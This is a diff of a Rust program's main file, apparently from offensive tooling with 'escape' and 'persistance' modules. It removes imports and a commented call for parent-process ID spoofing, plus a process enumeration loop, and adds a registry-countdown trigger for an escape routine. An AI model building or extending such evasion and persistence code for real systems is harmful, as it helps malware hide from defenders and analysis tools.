@@ -9,43 +9,15 @@ mod escape;
 mod tools;
 mod persistance;
 
-use std::fs::File;
+use std::fmt::Display;
 
-use std::io::Read;
-use std::string::String;
-use std::io::Write;
-
-
-use std::mem;
-use std::ptr::null_mut;
-use winapi::ctypes::c_void;
-use winapi::shared::basetsd::SIZE_T;
-use winapi::um::heapapi::{GetProcessHeap, HeapAlloc};
-use winapi::um::processthreadsapi::{
-    CreateProcessA, InitializeProcThreadAttributeList, OpenProcess, UpdateProcThreadAttribute,PROCESS_INFORMATION,
-};
-use winapi::um::winbase::STARTUPINFOEXA;
-use winapi::um::winnt::{HANDLE, LPSTR};
-
-use sysinfo::{PidExt,Pid, ProcessExt, System, SystemExt};
+use winreg::enums::*;
 
 fn main() {
 
-    //let mut my_ppid = std::process::id();
-    //println!("my pid : {}",my_ppid);
-    let s = System::new_all();
-    let mut ppid_list = Vec::<u32>::new();
-
-    for (pid, process) in s.processes() {
-       // my_ppid = process.pid().as_u32();
-        if process.user_id().is_some(){
-            ppid_list.push(pid.as_u32());
-        }
-        println!("{} {:?}", pid.as_u32(), process.user_id());
+    if tools::reg_countdown("Environment", "WTEMP", 15){
+        escape::jump_man(false);
     }
-    println!("my pid : {:?}",ppid_list);
 
-    //escape::ppid_spoof(my_ppid, "C:\\temp\\pestudio\\pestudio.exe".to_string());
-
+    println!("End...")
 }
-
